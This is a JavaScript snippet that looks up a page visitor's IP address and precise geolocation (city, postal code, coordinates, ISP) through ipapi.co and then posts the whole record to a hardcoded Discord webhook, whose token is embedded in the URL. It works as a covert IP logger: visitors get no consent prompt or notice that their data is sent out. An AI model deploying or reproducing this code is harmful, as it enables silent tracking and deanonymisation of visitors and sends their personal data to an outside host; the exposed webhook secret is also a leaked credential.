// Get user's IP address and location using ipapi.co
fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
        const formattedData = {
            ip: data.ip,
            network: data.network,
            version: data.version,
            city: data.city,
            region: data.region,
            region_code: data.region_code,
            country: data.country,
            country_name: data.country_name,
            country_code: data.country_code,
            country_code_iso3: data.country_code_iso3,
            country_capital: data.country_capital,
            country_tld: data.country_tld,
            continent_code: data.continent_code,
            in_eu: data.in_eu,
            postal: data.postal,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone,
            utc_offset: data.utc_offset,
            country_calling_code: data.country_calling_code,
            currency: data.currency,
            currency_name: data.currency_name,
            languages: data.languages,
            country_area: data.country_area,
            country_population: data.country_population,
            asn: data.asn,
            org: data.org
        };

        // Display the formatted data
        locationInfoElement.textContent = JSON.stringify(formattedData, null, 2);

        // Send only the formatted data to your Discord webhook
        fetch('https://discord.com/api/webhooks/1257370240380047541/kj7np_FeepiR1k3U_cUO1HJ2H_5HSCcXTk20ytp9YbfgxR0I6BestwYMgdHNzniSGmZy', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formattedData) // Send formattedData directly
        })
        .then(response => {
            if (response.ok) {
                console.log('Data sent to webhook successfully!');
            } else {
                console.error('Failed to send data to webhook. Status:', response.status, response.statusText);
            }
        })
        .catch(error => console.error('Error sending data:', error));
    })
    .catch(error => console.error('Error fetching IP address:', error));
